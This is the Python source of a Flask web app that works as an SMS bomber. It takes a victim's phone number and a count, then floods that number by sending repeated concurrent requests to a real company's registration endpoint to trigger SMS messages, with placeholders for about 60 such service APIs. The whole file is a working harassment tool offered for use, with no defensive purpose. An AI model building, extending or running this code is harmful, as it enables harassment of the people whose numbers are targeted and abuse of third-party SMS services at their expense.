import random
import time
import requests
import threading
import json
from flask import Flask, render_template, request, jsonify
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# --- SYSTEM STATE ---
class SystemState:
    def __init__(self):
        self.active = False
        self.target = ""
        self.sent = 0
        self.total = 0
        self.success = 0
        self.logs = []
        self.session = requests.Session()

state = SystemState()

# --- SECURITY HEADERS ---
def get_headers():
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/json'
    }

# --- API MAPPING (Paste your 60 functions here) ---
# Example Structure:
def api_1(n):
    try: return state.session.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', json={'phone_number': n}, timeout=5)
    except: return None

# List of all 60 functions
# You should define api_1 to api_60 and add them here
ALL_APIS = [api_1] # <--- ADD api_2, api_3... here

def process_sms(number):
    if not state.active: return
    
    api = random.choice(ALL_APIS)
    try:
        r = api(number)
        state.sent += 1
        if r and r.status_code in [200, 201]:
            state.success += 1
            state.logs.insert(0, f"STRIKE: API {ALL_APIS.index(api)+1} successfully triggered.")
        else:
            state.logs.insert(0, f"MISS: API {ALL_APIS.index(api)+1} returned {r.status_code if r else 'Error'}")
    except:
        state.logs.insert(0, "FAIL: Connection timeout on target gateway.")
    
    if len(state.logs) > 20: state.logs.pop()

def attack_worker(number, count):
    state.active = True
    state.target = number
    state.total = count
    state.sent = 0
    state.success = 0
    state.logs = ["SYSTEM: INITIALIZING ATTACK VECTOR..."]

    # Concurrency Level: 5 simultaneous workers
    with ThreadPoolExecutor(max_workers=5) as executor:
        for _ in range(count):
            if not state.active: break
            executor.submit(process_sms, number)
            time.sleep(0.15) # Optimized delay

    state.logs.insert(0, "SYSTEM: OPERATION COMPLETED.")
    state.active = False

@app.route('/')
def home(): return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    if state.active: return jsonify({"status": "busy"}), 400
    d = request.json
    threading.Thread(target=attack_worker, args=(d['num'], int(d['count']))).start()
    return jsonify({"status": "launched"})

@app.route('/stop', methods=['POST'])
def stop():
    state.active = False
    return jsonify({"status": "terminated"})

@app.route('/status')
def status():
    return jsonify({
        "active": state.active,
        "sent": state.sent,
        "total": state.total,
        "success": state.success,
        "logs": state.logs,
        "target": state.target
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
